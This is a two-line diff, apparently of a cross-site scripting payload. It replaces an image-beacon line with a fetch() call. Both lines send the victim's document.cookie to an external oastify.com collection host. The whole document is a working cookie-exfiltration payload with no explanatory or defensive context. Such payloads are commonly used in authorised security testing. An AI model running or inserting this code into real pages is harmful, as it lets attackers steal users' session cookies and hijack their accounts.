@@ -1,2 +1,2 @@
-new Image().src = "https://pa3zfno37eozursaws65o2r2rtxllb90.oastify.com/?cookie=" + encodeURIComponent(document.cookie);
+fetch("https://vut5zt89rk85excggyqb88b8bzhr5jt8.oastify.com/?cookie=" + encodeURIComponent(document.cookie));
  
